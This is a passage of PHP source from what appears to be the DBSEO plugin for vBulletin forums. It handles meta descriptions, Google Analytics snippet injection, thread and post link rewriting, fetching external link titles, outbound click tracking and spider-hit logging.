			$_description = preg_replace('#[\s\"]+#s', ' ', strip_tags($_description));

			if (self::$config['dbtech_dbseo_removestopwords_metadescription'])
			{
				// Replace stopwords
				$_description = preg_replace_callback(
					'#\b(' . self::$config['dbtech_dbseo_stopwordlist' . (self::$config['dbtech_dbseo_removestopwords_metadescription'] == 2 ? '' : '_metadescription')] . ')\b#i',
					array('DBSEO', 'replaceStopWords'),
					$_description
				);
			}

			if (strlen($_description) > self::$config['dbtech_dbseo_metadescription_length'])
			{
				// Shorten the description
				$_description = self::subStr($_description, self::$config['dbtech_dbseo_metadescription_length']);
			}

			// Ensure this is quoted properly
			$_description = trim(str_replace(array('$','\\','"','&quot;'), array('\$','\\\\', "'", "'"), $_description));

			// Do FB Meta replacements
			self::updateFBMeta($content, 'description', $_description);

			// Do normal Meta replacements
			$content = preg_replace('#(<meta name="description".*?content=)"' . ($_appendDescription ? '' : '[^"]*') . '#is', '$1"' . $_description, $content);
		}

		// Grab our title tags
		preg_match('#<title[^>]*?\>(.+?)</title[^>]*?\>#is', $content, $titleMatches);

		// Do FB Meta replacements
		self::updateFBMeta($content, 'title', $titleMatches[1]);

		// GOOGLE ANALYTICS
		if (self::$config['dbtech_dbseo_analytics_active'] AND self::$config['dbtech_dbseo_analytics_account'] AND !self::$config['dbtech_dbseo_rewrite_texturls'] AND !self::$config['_inAjax'])
		{
			// Init some important variables
			$trackingUrl = '';
			$trackingOptions = array();

			if (THIS_SCRIPT == 'search' AND $_REQUEST['do'] == 'showresults')
			{
				$searchQuery = $GLOBALS['display']['highlight'] ? implode(' ', $GLOBALS['display']['highlight']) : '';
				if (!$searchQuery AND is_object($GLOBALS['results']))
				{
					// Grab the keywords from the results
					$searchQuery = $GLOBALS['results']->get_criteria()->get_raw_keywords();
				}

				if ($searchQuery)
				{
					// Use tracking url
					$trackingUrl = 'search.php?q=' . urlencode($searchQuery);
				}
			}

			if (self::$config['dbtech_dbseo_analytics_universal'])
			{
				$_extraParams = array();
				if (self::$config['cookiedomain'])
				{
					$_extraParams[] = "'cookieDomain': '" . addslashes(self::$config['cookiedomain']) . "'";
				}

				if (self::$config['dbtech_dbseo_analytics_userid'] AND $GLOBALS['vbulletin']->userinfo['userid'])
				{
					$_extraParams[] = "'userId': '" . intval($GLOBALS['vbulletin']->userinfo['userid']) . "'";
				}

				$content = str_replace('</head>', "
					<script type=\"text/javascript\">
					<!--
						(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
						(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
						m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
						})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

						ga('create', '" . addslashes(self::$config['dbtech_dbseo_analytics_account']) . "', " . (!count($_extraParams) ? "'auto'" : "{" . implode(', ', $_extraParams) . "}") . ");

						" . (self::$config['dbtech_dbseo_analytics_displayfeatures'] ? "ga('require', 'displayfeatures');" : '') . "

						" . (self::$config['dbtech_dbseo_analytics_linkattributes'] ? "ga('require', 'linkid', 'linkid.js');" : '') . "

						ga('set', 'anonymizeIp', " . (self::$config['dbtech_dbseo_analytics_anonymise'] ? 'true' : 'false') . ");

						ga('send', 'pageview'" . ($trackingUrl ? ",'$trackingUrl'" : "") . ");
					//-->
					</script>
				</head>", $content);
			}
			else
			{
				// Add two tracking elements
				array_push($trackingOptions, "['_trackPageview'" . ($trackingUrl ? ",'$trackingUrl'" : "") . "]");

				// Add the account info
				array_unshift($trackingOptions, "['_setAccount', '" . addslashes(self::$config['dbtech_dbseo_analytics_account']) . "']");

				if (self::$config['dbtech_dbseo_analytics_linkattributes'])
				{
					// Override domain name with cookie domain
					array_unshift($trackingOptions, "['_require', 'inpage_linkid', inPagePlugin]");
				}

				if (self::$config['cookiedomain'])
				{
					// Override domain name with cookie domain
					array_unshift($trackingOptions, "['_setDomainName', '" . addslashes(self::$config['cookiedomain']) . "']");
				}

				if (self::$config['dbtech_dbseo_analytics_anonymise'])
				{
					// Override domain name with cookie domain
					array_unshift($trackingOptions, "['_gat._anonymizeIp']");
				}

				$content = str_replace('</head>', "
					<script type=\"text/javascript\">
					<!--
						var _gaq = _gaq || [];
						var inPagePlugin = '//www.google-analytics.com/plugins/ga/inpage_linkid.js';

						_gaq.push(" . implode(");\n\n_gaq.push(", $trackingOptions) . ");

						(function() {
							var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
							" . (self::$config['dbtech_dbseo_analytics_displayfeatures'] ?
								"ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';" :
								"ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';"
							) . "
							var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
						})();
					//-->
					</script>
				</head>", $content);
			}
		}
		// END GOOGLE ANALYTICS

		return $content;
	}

	/**
	 * Replace text urls
	 */
	public static function replaceTextUrls($matches)
	{
		return DBSEO_Url::replace($matches[1], $matches[2]);
	}

	/**
	 * Replace main content
	 */
	public static function replaceMainContent($matches)
	{
		return stripslashes($matches[1]) . DBSEO_Url::replace('', $matches[2] . $matches[3]);
	}

	/**
	 * Replace tags
	 */
	public static function replaceTags($matches)
	{
		return DBSEO_Url::replace($matches[1], $matches[3], $matches[2], $matches[4], $matches[5], $matches[6]);
	}

	/**
	 * Replace tags
	 */
	public static function urlDecodeCallback($matches)
	{
		return urldecode($matches[1]);
	}

	/**
	 * Replace tags
	 */
	public static function customRuleMatchOther($matches)
	{
		return self::$cache['otherMatches'][0][intval($matches[1]) - 1];
	}

	/**
	 * Replace tags
	 */
	public static function customRuleMatchNumber($matches)
	{
		return '$' . (array_search(++self::$cache['numberMatchCounter'], self::$cache['numberMatches'][1]) + 1);
	}

	/**
	 * Replace thread IDs
	 *
	 * @param string $matches
	 *
	 * @return string
	 */
	public static function replaceThreadId($matches)
	{
		// Un-quote these
		$matches[1] = str_replace('\"', '"', $matches[1]);
		$matches[2] = str_replace('\"', '"', $matches[2]);

		// Store thread ID
		self::$cache['_objectIds']['found_thread_ids'][] = $matches[3];

		// Return parsed content
		return $matches[1] . "!" . $matches[3] . "!" . str_replace(self::$config['_bburl'] . '/', '', $matches[2]);
	}

	/**
	 * Replace thread IDs
	 *
	 * @param string $matches
	 *
	 * @return string
	 */
	public static function replaceThreadIdInstant($matches)
	{
		// Store thread ID
		self::$cache['_objectIds']['found_thread_ids'][] = $matches[1];

		$url = self::$config['_bburl'] . '/' . DBSEO_Url_Create::create('Thread_Thread', array('threadid' => $matches[1]));
		$title = DBSEO::$cache['thread'][$matches[1]]['title'];

		// Return parsed content
		return array('url' => $url, 'title' => $title);
	}

	/**
	 * Replace thread IDs
	 *
	 * @param string $matches
	 *
	 * @return string
	 */
	public static function replaceThreadIdAlt($matches)
	{
		// Un-quote these
		$matches[1] = str_replace('\"', '"', $matches[1]);
		$matches[2] = str_replace('\"', '"', $matches[2]);

		// Store thread ID
		self::$cache['_objectIds']['found_thread_ids'][] = $matches[3];

		// Return parsed content
		return $matches[1] . "!m" . $matches[3] . "!" . str_replace(self::$config['_bburl'] . '/', '', $matches[2]);
	}

	/**
	 * Replace thread IDs
	 *
	 * @param string $matches
	 *
	 * @return string
	 */
	public static function replaceThreadIdInstantAlt($matches)
	{
		// Store thread ID
		self::$cache['_objectIds']['found_thread_ids'][] = $matches[1];

		// Perform this lookup
		DBSEO_Url_Create::create('Thread_Thread', array('threadid' => $matches[1]));

		$title = DBSEO::$cache['thread'][$matches[1]]['title'];

		return array('url' => $matches[0], 'title' => $title);
	}

	/**
	 * Replace thread IDs
	 *
	 * @param string $matches
	 *
	 * @return string
	 */
	public static function replaceThreadIdWithPost($matches)
	{
		// Un-quote these
		$matches[1] = str_replace('\"', '"', $matches[1]);
		$matches[2] = str_replace('\"', '"', $matches[2]);

		// Store thread ID
		self::$cache['_objectIds']['found_thread_ids'][] = $matches[3];
		self::$cache['_objectIds']['found_post_ids'][] = $matches[4];

		// Return parsed content
		return $matches[1] . "!g" . $matches[4] . "!" . str_replace(self::$config['_bburl'] . '/', '', $matches[2]);
	}

	/**
	 * Replace thread IDs
	 *
	 * @param string $matches
	 *
	 * @return string
	 */
	public static function replaceThreadIdWithPostInstant($matches)
	{
		// Store thread ID
		self::$cache['_objectIds']['found_thread_ids'][] = $matches[1];
		self::$cache['_objectIds']['found_post_ids'][] = $matches[2];

		$url = self::$config['_bburl'] . '/' . DBSEO_Url_Create::create('Thread_Thread_GoToPost', array('threadid' => $matches[1], 'postid' => $matches[2])) . '#post' . $matches[2];
		$title = DBSEO::$cache['thread'][$matches[1]]['title'];

		// Return parsed content
		return array('url' => $url, 'title' => $title);
	}

	/**
	 * Replace post IDs
	 *
	 * @param string $matches
	 *
	 * @return string
	 */
	public static function replacePostId($matches)
	{
		if (!$matches[3])
		{
			// Return parsed content
			return $matches[1] . $matches[2];
		}
		else
		{
			// Un-quote these
			$matches[1] = str_replace('\"', '"', $matches[1]);
			$matches[2] = str_replace('\"', '"', $matches[2]);

			// Store thread ID
			self::$cache['_objectIds']['found_post_ids'][] = $matches[3];

			// Return parsed content
			return $matches[1] . "!p" . $matches[3] . "!" . $matches[2];
		}
	}

	/**
	 * Replace post IDs
	 *
	 * @param string $matches
	 *
	 * @return string
	 */
	public static function replacePostIdInstant($matches)
	{
		self::$cache['_objectIds']['found_post_ids'][] = $matches[1];

		$postInfo = DBSEO::getThreadPostInfo($matches[1]);

		$url = self::$config['_bburl'] . '/' . DBSEO_Url_Create::create('ShowPost_ShowPost', array('threadid' => $postInfo['threadid'], 'postid' => $matches[1]));
		$title = DBSEO::$cache['thread'][$postInfo['threadid']]['title'];

		// Return parsed content
		return array('url' => $url, 'title' => $title);
	}

	/**
	 * Replace profile meta tag
	 *
	 * @param string $matches
	 *
	 * @return string
	 */
	public static function replaceProfileMeta($matches)
	{
		// Return parsed content
		return self::$cache['userinfo']['field' . $matches[1]];
	}

	/**
	 * Replace external links in threaded mode
	 *
	 * @param string $matches
	 *
	 * @return string
	 */
	public static function replaceExternalLinks($matches)
	{
		if (self::$config['dbtech_dbseo_analytics_universal'])
		{
			// Return parsed content
			return $matches[1] . "'" . preg_replace_callback(
				'#(ga\(\'send\', \'event\', .*?\))#i',
				array('DBSEO', 'replaceExternalLinks2'),
				str_replace('\\"', '"', $matches[2])
			);
		}
		else
		{
			// Return parsed content
			return $matches[1] . "'" . preg_replace_callback(
				'#(_gaq\.push\(\[.*?\])#i',
				array('DBSEO', 'replaceExternalLinks2'),
				str_replace('\\"', '"', $matches[2])
			);
		}
	}

	/**
	 * Replace external links in threaded mode (step 2)
	 *
	 * @param string $matches
	 *
	 * @return string
	 */
	public static function replaceExternalLinks2($matches)
	{
		// Return parsed content
		return str_replace("'", "\\'", $matches[1]);
	}

	/**
	 * Replaces unicode characters
	 *
	 * @param string $matches
	 *
	 * @return string
	 */
	public static function replaceUnicodeChars($matches)
	{
		// Return parsed content
		return "'&#" . hexdec($matches[1]). ";'";
	}

	/**
	 * Replaces other characters
	 *
	 * @param string $matches
	 *
	 * @return string
	 */
	public static function replaceCharacters($matches)
	{
		// Return parsed content
		return chr($matches[1]);
	}

	/**
	 * Replaces keywords
	 *
	 * @param string $matches
	 *
	 * @return string
	 */
	public static function replaceStopWords($matches)
	{
		// Return parsed content
		return (((self::$cache['keyWordCount2']--) <= 0) ? $matches[1] : '');
	}

	/**
	 * Replaces characters with UTF-8 characters
	 *
	 * @param string $matches
	 *
	 * @return string
	 */
	public static function toUtf8($matches)
	{
		// Return parsed content
		if ($matches[1] < 128) return chr($matches[1]);
		if ($matches[1] < 2048) return chr(($matches[1] >> 6) + 192) . chr(($matches[1] & 63) + 128);
		if ($matches[1] < 65536) return chr(($matches[1] >> 12) + 224) . chr((($matches[1] >> 6) & 63) + 128) . chr(($matches[1] & 63) + 128);
		if ($matches[1] < 2097152) return chr(($matches[1] >> 18) + 240) . chr((($matches[1] >> 12) & 63) + 128) . chr((($matches[1] >> 6) & 63) + 128) . chr(($matches[1] & 63) + 128);
		return '';
	}

	/**
	 * Replace post IDs
	 *
	 * @param string $matches
	 *
	 * @return string
	 */
	public static function getReverseFormat($format)
	{
		return preg_replace(array(
			'#%thread_id%#',
			'#%thread_page%#',
			'#%post_id%#',
			'#%post_count%#',
			'#%[a-z_]+_id%#',
			'#%[a-z_]+_path%#',
			'#%[a-z_]+%#'
		), array(
			'(\d+)',
			'\d+',
			'(\d+)',
			'\d+',
			'\d+',
			'.+',
			'[^/]+'
		), preg_quote($format, '#'));
	}

	/**
	 * Replace IDs
	 *
	 * @param string $content
	 *
	 * @return mixed
	 */
	public static function replaceIds($content, $debug = true)
	{
		if (self::$config['dbtech_dbseo_rewrite_texturls'] OR !self::$config['dbtech_dbseo_linktitles'])
		{
			// We're not doing this
			return $content;
		}

		// Shorthand
		$_fullBbUrl = str_replace(array('http\://', 'https\://'), 'https?\://', preg_quote(self::$config['_bburl'] . '/', '#'));

		$replacements = array(
			'(?:show|print)thread\.php\?[^"]*?t(?:hreadid)?=(\d+)' 							=> array('DBSEO', 'replaceThreadId'),
			'showpost\.php\?[^"]*?p(?:ostid)?=(\d+)' 										=> array('DBSEO', 'replacePostId'),
			self::getReverseFormat(self::$cache['rawurls']['thread']['Thread_GoToPost']) 	=> array('DBSEO', 'replaceThreadIdWithPost'),
			self::getReverseFormat(self::$cache['rawurls']['showpost']['ShowPost']) 		=> array('DBSEO', 'replacePostId'),
			self::getReverseFormat(self::$cache['rawurls']['thread']['Thread_Page']) 		=> array('DBSEO', 'replaceThreadIdAlt'),
			self::getReverseFormat(self::$cache['rawurls']['thread']['Thread']) 			=> array('DBSEO', 'replaceThreadId'),
		);

		foreach ($replacements as $regexp => $callback)
		{
			// Replace post ID
			$content = preg_replace_callback(
				'#(href=")(' . $_fullBbUrl . $regexp . '[^/"]*")#is',
				$callback,
				$content
			);
		}

		$replacements = array(
			'(?:show|print)thread\.php\?[^"]*?t(?:hreadid)?=(\d+)' 							=> array('DBSEO', 'replaceThreadIdInstant'),
			'showpost\.php\?[^"]*?p(?:ostid)?=(\d+)' 										=> array('DBSEO', 'replacePostIdInstant'),
		);

		preg_match_all('#\[url=?\"?(.*?)\"?\](.+?)\[\/url\]#is', $content, $matches);
		for ($i = 0; $i < count($matches[0]); $i++)
		{
			// Shorthand
			$urlLink = trim($matches[1][$i]);
			$urlContents = trim($matches[2][$i]);

			if ($urlLink AND strpos($urlContents, $urlLink) === false)
			{
				// We didn't have the same URL link as the contents, i.e. not [url=link]link[/url]
				continue;
			}

			if (!$urlLink)
			{
				// We didn't have a link, i.e. [url]link[/url]
				$urlLink = $urlContents;
			}

			foreach ($replacements as $regexp => $callback)
			{
				// Replace post ID
				if (preg_match('#' . $_fullBbUrl . $regexp . '#is', $urlContents, $matches2))
				{
					$retval = call_user_func($callback, $matches2);
					$content = str_replace($matches[0][$i], '[URL="' . $retval['url'] . '"]' . $retval['title'] . '[/URL]', $content);
				}
			}
		}

		$replacements = array(
			self::getReverseFormat(self::$cache['rawurls']['thread']['Thread_GoToPost']) 	=> array('DBSEO', 'replaceThreadIdWithPostInstant'),
			self::getReverseFormat(self::$cache['rawurls']['showpost']['ShowPost']) 		=> array('DBSEO', 'replacePostIdInstant'),
			self::getReverseFormat(self::$cache['rawurls']['thread']['Thread_Page']) 		=> array('DBSEO', 'replaceThreadIdInstantAlt'),
			self::getReverseFormat(self::$cache['rawurls']['thread']['Thread']) 			=> array('DBSEO', 'replaceThreadIdInstant'),
		);

		preg_match_all('#\[url=?\"?(.*?)\"?\](.+?)\[\/url\]#is', $content, $matches);
		for ($i = 0; $i < count($matches[0]); $i++)
		{
			// Shorthand
			$urlLink = trim($matches[1][$i]);
			$urlContents = trim($matches[2][$i]);

			if ($urlLink AND strpos($urlContents, $urlLink) === false)
			{
				// We didn't have the same URL link as the contents, i.e. not [url=link]link[/url]
				continue;
			}

			if (!$urlLink)
			{
				// We didn't have a link, i.e. [url]link[/url]
				$urlLink = $urlContents;
			}

			foreach ($replacements as $regexp => $callback)
			{
				// Replace post ID
				if (preg_match('#' . $_fullBbUrl . $regexp . '#is', $urlContents, $matches2))
				{
					$retval = call_user_func($callback, $matches2);

					if (strpos($retval['url'], $urlLink) === false)
					{
						continue;
					}

					$content = str_replace($matches[0][$i], '[URL="' . $urlLink . '"]' . $retval['title'] . '[/URL]', $content);
				}
			}
		}

		return $content;
	}

	/**
	 * Appends template code
	 *
	 * @param string $templateName
	 * @param string $templateCode
	 *
	 * @return mixed
	 */
	public static function addTemplateCode($templateName, $templateCode)
	{
		global $vbulletin;

		if (!isset($vbulletin->templatecache[$templateName]))
		{
			// Template didn't exist
			return false;
		}

		if (intval(self::$config['templateversion']) == 4 AND strpos($vbulletin->templatecache[$templateName], 'final_rendered') !== false)
		{
			// We have $final_rendered
			$templateCode .= ';';
		}
		else
		{
			// Inject it in the middle of a template
			$templateCode = '" . ((' . $templateCode . ') ? "" : "") . "';
		}

		// Shorthand
		$template =& $vbulletin->templatecache[$templateName];

		// Back this up
		$_template = $template;

		// Append the template
		$template .= $templateCode;

		return ($template != $_template);
	}

	/**
	 * Transforms external links into titled links
	 *
	 * @param string $message
	 * @param boolean $cleanRedirect
	 *
	 * @return mixed
	 */
	public static function linkExternalTitles($message, $cleanRedirect = true)
	{
		if (!$message)
		{
			// Just in case
			return $message;
		}

		if (!function_exists('curl_init'))
		{
			// Just in case
			return $message;
		}

		if ($cleanRedirect)
		{
			// We need to urldecode the redirect links
			$message = preg_replace_callback(
				'#' . preg_quote(self::$config['_bburl'] . '/redirect-to/?redirect=', '#') . '([^"\]\[]*)#is',
				array('DBSEO', 'urlDecodeCallback'),
				$message
			);
		}

		if (!self::$config['dbtech_dbseo_linktitles_external'])
		{
			// We're not doing this
			return $message;
		}

		preg_match_all('#\[url=?\"?(.*?)\"?\](.+?)\[\/url\]#is', $message, $matches);
		for ($i = 0; $i < count($matches[0]); $i++)
		{
			if (self::$config['dbtech_dbseo_linktitles_external_limit'] AND ($i + 1) > self::$config['dbtech_dbseo_linktitles_external_limit'])
			{
				// No more of this nonsense
				break;
			}

			// Shorthand
			$urlLink = trim($matches[1][$i]);
			$urlContents = trim($matches[2][$i]);

			if ($urlLink AND strpos($urlContents, $urlLink) === false)
			{
				// We didn't have the same URL link as the contents, i.e. not [url=link]link[/url]
				continue;
			}

			if (strpos($urlContents, '://') === false)
			{
				// Ensure we add http if required
				$urlContents = 'http://' . $urlContents;
			}

			if (!$urlLink)
			{
				// We didn't have a link, i.e. [url]link[/url]
				$urlLink = $urlContents;
			}

			if (!(preg_match('#^https?://#', $urlContents) AND (
				!self::$config['dbtech_dbseo_linktitles_external_blacklist'] OR
				!preg_match('#' . self::$config['dbtech_dbseo_linktitles_external_blacklist'] . '#i', $urlContents)
			)))
			{
				// We're done here
				continue;
			}

			/*
			// Shorthand
			$_fullBbUrl = preg_quote(self::$config['_bburl'] . '/', '#');

			// Check if it's an internal link
			$_isMatch = false;
			$_isMatch |= preg_match('#' . $_fullBbUrl . self::getReverseFormat(self::$config['dbtech_dbseo_rewrite_rule_showpost']) . 		'#is', $urlContents);
			$_isMatch |= preg_match('#' . $_fullBbUrl . self::getReverseFormat(self::$config['dbtech_dbseo_rewrite_rule_thread_page']) . 	'#is', $urlContents);
			$_isMatch |= preg_match('#' . $_fullBbUrl . self::getReverseFormat(self::$config['dbtech_dbseo_rewrite_rule_thread']) . 		'#is', $urlContents);
			$_isMatch &= !preg_match('#' . $_fullBbUrl . self::getReverseFormat(self::$config['dbtech_dbseo_rewrite_rule_cmsentry']) . 		'#is', $urlContents);

			vbstop(preg_match('#' . $_fullBbUrl . self::getReverseFormat(self::$config['dbtech_dbseo_rewrite_rule_cmsentry']) . 		'#is', $urlContents));

			if ($_isMatch)
			{
				// We're done here
				continue;
			}
			*/

			if (strpos($urlContents, self::$config['_bburl'] . '/') !== false)
			{
				// This was an internal URL
				continue;
			}

			// Ensure this doesn't error
			$page = array('header' => '', 'content' => '');

			if ($ch = curl_init())
			{
				// This was not a supported internal URL
				curl_setopt($ch, CURLOPT_URL, 				$urlContents);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 	true);
				curl_setopt($ch, CURLOPT_VERBOSE, 			true);
				curl_setopt($ch, CURLOPT_HEADER, 			true);
				curl_setopt($ch, CURLOPT_TIMEOUT, 			5);
				curl_setopt($ch, CURLOPT_NOBODY, 			true);
				curl_exec_follow($ch);
				$contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
				curl_close($ch);
			}

			if (strpos($contentType, 'text/html') !== false AND $ch = curl_init())
			{
				// This was not a supported internal URL
				curl_setopt($ch, CURLOPT_URL, 				$urlContents);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 	true);
				curl_setopt($ch, CURLOPT_VERBOSE, 			true);
				curl_setopt($ch, CURLOPT_HEADER, 			true);
				curl_setopt($ch, CURLOPT_TIMEOUT, 			5);
				list($page['header'], $page['content']) = explode("\r\n\r\n", curl_exec_follow($ch), 2);
				curl_close($ch);
			}

			if (!$page['content'])
			{
				// We're done here
				continue;
			}

			// In case we had a bogus title tag inside comments
			$page['content'] = preg_replace('#<!--.*?-->#s', '', $page['content']);

			// Grab our title tags
			preg_match('#<title[^>]*?\>(.+?)</title[^>]*?\>#is', $page['content'], $titleMatches);

			if (!preg_match('#content-type:.*?charset=([a-z0-9\-]+)#is', $page['header'], $charsets))
			{
				// Try matching against meta
				preg_match('#<meta(?!\s*(?:name|value)\s*=)[^>]*?charset\s*=[\s"\']*([^\s"\'/>]*)#is', $page['content'], $charsets);
			}

			if ($_tmp = preg_replace_callback(
				'#&\#x([a-fA-F0-9]{2});#u',
				array('DBSEO', 'replaceUnicodeChars'),
				$titleMatches[1]
			))
			{
				// Unicode decodings
				$titleMatches[1] = $_tmp;
			}

			if ($_tmp = preg_replace_callback(
				'#&\#([0-9]{3});#u',
				array('DBSEO', 'replaceCharacters'),
				$titleMatches[1]
			))
			{
				// More decodings
				$titleMatches[1] = $_tmp;
			}

			require_once(DIR . '/dbtech/dbseo/includes/3rdparty/portable-utf8/voku/helper/UTF8.php');
			require_once(DIR . '/dbtech/dbseo/includes/3rdparty/portable-utf8/voku/helper/Bootup.php');
			require_once(DIR . '/dbtech/dbseo/includes/3rdparty/portable-utf8/Patchwork/PHP/Shim/Iconv.php');
			require_once(DIR . '/dbtech/dbseo/includes/3rdparty/portable-utf8/Patchwork/PHP/Shim/Intl.php');
			require_once(DIR . '/dbtech/dbseo/includes/3rdparty/portable-utf8/Patchwork/PHP/Shim/Mbstring.php');
			require_once(DIR . '/dbtech/dbseo/includes/3rdparty/portable-utf8/Patchwork/PHP/Shim/Normalizer.php');
			require_once(DIR . '/dbtech/dbseo/includes/3rdparty/portable-utf8/Patchwork/PHP/Shim/Xml.php');
			require_once(DIR . '/dbtech/dbseo/includes/3rdparty/portable-utf8/Patchwork/Utf8/Bootup.php');

			if (strtolower($charsets[1]) == 'utf-8')
			{
				//vbstop(\voku\helper\UTF8::split(\voku\helper\UTF8::trim(\voku\helper\UTF8::html_entity_decode($titleMatches[1]))), false, false);
				//vbstop(\voku\helper\UTF8::codepoints(\voku\helper\UTF8::trim(\voku\helper\UTF8::html_entity_decode($titleMatches[1]))));
				$pageTitle = '';
				foreach (\voku\helper\UTF8::codepoints(\voku\helper\UTF8::trim(\voku\helper\UTF8::html_entity_decode($titleMatches[1]))) as $chr)
				{
					if ($chr == 0)
					{
						$pageTitle .= '0';
					}
					else if ($chr <= 127)
					{
						// Show as normal characters
						$pageTitle .= chr($chr);
					}
					else if ($chr <= 255)
					{
						// Entity encode that vB won't muck up
						//$pageTitle .= "&#$chr;";
						$pageTitle .= \voku\helper\UTF8::to_ascii(\voku\helper\UTF8::decimal_to_chr($chr));
					}
					else
					{
						$pageTitle .= "&#$chr;";
					}
				}

				//vbstop($pageTitle);
			}
			else
			{
				if ($charsets[1])
				{
					// Decode HTML entities
					$titleMatches[1] = @html_entity_decode($titleMatches[1], ENT_COMPAT, $charsets[1]);
					//$titleMatches[1] = @htmlentities($titleMatches[1], ENT_COMPAT|ENT_HTML401, $charsets[1]);
				}

				// Convert the string to our current charset
				$titleMatches[1] = self::_toCharset($titleMatches[1], $charsets[1]);

				// Detect the encoding we want
				$target_encoding = $GLOBALS['stylevar']['charset'];
				$target_encoding = $target_encoding ? $target_encoding : $GLOBALS['vbulletin']->userinfo['lang_charset'];
				$target_encoding = $target_encoding ? $target_encoding : '';

				// Do final preparations on the page title
				$pageTitle = self::subStr(str_replace(array('&rsaquo;', '&trade;'), array(chr(155), chr(153)), strtr(trim(preg_replace('#\s+#', ' ', $titleMatches[1])), array_flip(get_html_translation_table(HTML_ENTITIES, ENT_COMPAT|ENT_HTML5, $target_encoding)))), 250);
			}

			if ($pageTitle AND $pageTitle != self::$config['bbtitle'])
			{
				// The page title was not the forum title
				$message = str_replace($matches[0][$i], '[url=' . $urlContents . ']' . $pageTitle . '[/url]', $message);
			}
		}

		return $message;
	}

	/**
	 * Track external link
	 */
	public static function trackExternalLink(&$urlPrefix, $url, &$urlSuffix, $clickHandler = '')
	{
		if (!self::$config['dbtech_dbseo_analytics_active'] OR !self::$config['dbtech_dbseo_analytics_track_external'])
		{
			// We're not using GA
			return;
		}

		if (!$clickHandler)
		{
			// Default click handler
			$clickHandler = 'onclick';
		}

		// Parse the link
		$parsedUrl = @parse_url($url);

		if (!is_array($parsedUrl))
		{
			// This doesn't appear to be an external URL
			return;
		}

		if (self::$config['dbtech_dbseo_analytics_universal'])
		{
			// Define the JS code to add
			$outLink = "ga('send', 'event', 'Outgoing', '" . addslashes($parsedUrl['host']) . "', '" . addslashes($parsedUrl['path'] . ($parsedUrl['query'] ? '?' . $parsedUrl['query'] : '')) . "');";
		}
		else
		{
			// Define the JS code to add
			$outLink = '_gaq.push([\'_trackEvent\', \'Outgoing\', \'' . addslashes($parsedUrl['host']) . '\', \'' . addslashes($parsedUrl['path'] . ($parsedUrl['query'] ? '?' . $parsedUrl['query'] : '')) . '\']);';
		}

		// Create a new suffix
		$urlSuffix2 = preg_replace('#(\sonclick=")(javascript\:)?#is', '\\1' . $outLink, $urlSuffix);

		if ($urlSuffix != $urlSuffix2)
		{
			// Set the suffix to the newly created one
			$urlSuffix = $urlSuffix2;
		}
		else
		{
			// Create a new prefix
			$urlPrefix2 = preg_replace('#(\sonclick=")(javascript\:)?#is', '\\1' . $outLink, $urlPrefix);

			// Set the prefix to the newly created one if need be
			$urlPrefix = $urlPrefix != $urlPrefix2 ? $urlPrefix2 : preg_replace('#(<a\s)#is', '\\1' . $clickHandler . '="' . $outLink . '" ', $urlPrefix);
		}
	}

	/*DBTECH_PRO_START*/
	/**
	 * Track spider hit
	 */
	public static function trackSpider($oldUrl = '')
	{
		if (!self::$config['dbtech_dbseo_enable_spiderlog'])
		{
			// We don't want logs around these parts
			return;
		}

		if ($oldUrl)
		{
			if (preg_match('#forumdisplay|showthread|member#', $script))
			{
				// We had a matching old script URL
				$script = '[old url - ' . $script . ']';
			}
			else
			{
				// Nothin to see here
				return;
			}
		}
		else
		{
			// Base script
			$script = substr($_SERVER['SCRIPT_NAME'], strstr(DBSEO_BASE, DBSEO_URL_SCRIPT_PATH) ? min(strlen(DBSEO_BASE), strlen(DBSEO_URL_SCRIPT_PATH)) : strlen(DBSEO_BASE));

			if (preg_match('#^(archive/index\.php)#', $script, $matches))
			{
				// This was the archive
				$script = $matches[1];
			}

			if (!self::$config['bbactive'])
			{
				// Forum was offline
				$script = '[forums-inactive]';
			}
		}

		if (preg_match('#[<>\/\?]#',$script))
		{
			// Unmatched script
			$script = 'other';
		}

		if (!$script)
		{
			// This must have been the home page
			$script = 'home';
		}

		if ($latestBuildLog = self::$db->generalQuery('
			SELECT sitemapbuildlogid
			FROM $dbtech_dbseo_sitemapbuildlog
			ORDER BY sitemapbuildlogid DESC LIMIT 1
		', true))
		{
			// Update last row
			self::$db->modifyQuery('
				UPDATE $dbtech_dbseo_sitemapbuildlog
				SET spiderhits = spiderhits + 1
				WHERE sitemapbuildlogid = ' . intval($latestBuildLog['sitemapbuildlogid'])
			);
		}

		if (self::$config['dbtech_dbseo_spiderlog_prune'])
		{
			// Create today's timestamp
			$date = mktime(0, 0, 0, date('n'), date('j'), date('Y'));

			// Update our bot info (spider)
			self::$db->modifyQuery('
				INSERT INTO $dbtech_dbseo_spiderlog
					(dateline, spider, script, hits)
				VALUES (
					' . $date . ',
					\'' . self::$db->escape_string(DBSEO_SPIDER) . '\',
					\'' . self::$db->escape_string($script) . '\',
					1
				)
				ON DUPLICATE KEY UPDATE hits = hits + 1
			');

			// Update our bot info (spider)
			self::$db->modifyQuery('
				INSERT INTO $dbtech_dbseo_spiderlog
					(dateline, spider, script, hits)
				VALUES (
					' . $date . ',
					\'' . self::$db->escape_string(DBSEO_SPIDER) . '\',
					\'all\',
					1
				)
				ON DUPLICATE KEY UPDATE hits = hits + 1
			');

			// Update our bot info (all)
			self::$db->modifyQuery('
				INSERT INTO $dbtech_dbseo_spiderlog
					(dateline, spider, script, hits)
				VALUES (
					' . $date . ',
					\'all\',
					\'' . self::$db->escape_string($script) . '\',
					1
				)
				ON DUPLICATE KEY UPDATE hits = hits + 1
			');

			// Update our bot info (all)
			self::$db->modifyQuery('
				INSERT INTO $dbtech_dbseo_spiderlog
					(dateline, spider, script, hits)
				VALUES (
					' . $date . ',
					\'all\',
					\'all\',
					1
				)
				ON DUPLICATE KEY UPDATE hits = hits + 1
			');
		}
	}
	/*DBTECH_PRO_END*/

	/**
